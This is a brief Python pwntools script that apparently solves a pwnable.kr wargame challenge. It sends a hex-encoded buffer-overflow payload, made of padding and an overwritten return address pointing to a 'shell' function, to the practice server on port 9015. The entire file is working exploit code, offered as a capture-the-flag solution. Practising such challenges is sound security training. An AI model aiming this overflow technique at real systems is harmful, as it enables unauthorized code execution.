from pwn import *
import binascii
shell = 0x04005f4
context(arch='amd64')

payload = b'-1' + b'\n'*4094+ b'a'*0x38 + p64(shell)+b'\n'
r = remote('pwnable.kr',9015)
r.recvuntil('payload please : ')
r.sendline(binascii.hexlify(payload))
print (r.recvall())